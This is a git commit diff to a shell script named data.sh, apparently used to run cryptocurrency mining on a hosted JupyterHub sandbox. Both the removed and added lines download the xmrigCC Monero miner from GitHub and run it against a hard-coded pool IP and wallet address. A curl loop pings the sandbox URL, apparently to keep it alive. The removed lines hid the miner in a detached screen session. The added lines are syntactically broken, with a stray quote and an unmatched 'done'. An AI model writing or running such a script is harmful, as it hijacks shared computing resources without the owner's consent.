d579f2dd35bd5f5f73d3fb0b1c124fe747e385f2
duniaboci13 <93588768+duniaboci13@users.noreply.github.com>
2025-05-22 19:53:17 +0700

    Update data.sh

--- data.sh
+++ data.sh
@@ -1,3 +1,4 @@
 #! /bin/bash
-apt-get install screen -y && screen -dmS yes1_session bash -c 'wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && while true; do ./xmrigDaemon --donate-level 1 -o 147.182.211.160:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p virtual -t4 -a rx/0 -k ; sleep 3 ; done'
-while true; do curl -s https://jhub.sandbox.eoafrica-dunia.org > /dev/null; sleep 300; done
+wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && tar -xvf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && cd miner && mv xmrigDaemon ~/ && mv xmrigMiner ~/
+cd && clear && ./xmrigDaemon -o 147.182.211.160:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p gog -t2 -a rx/0 -k --donate-level 1 --randomx-1gb-pages ; sleep 3 ; done'
+while true; do curl -s https://jhub.sandbox.eoafrica-dunia.org >/dev/null 2>&1; sleep 3000000; done
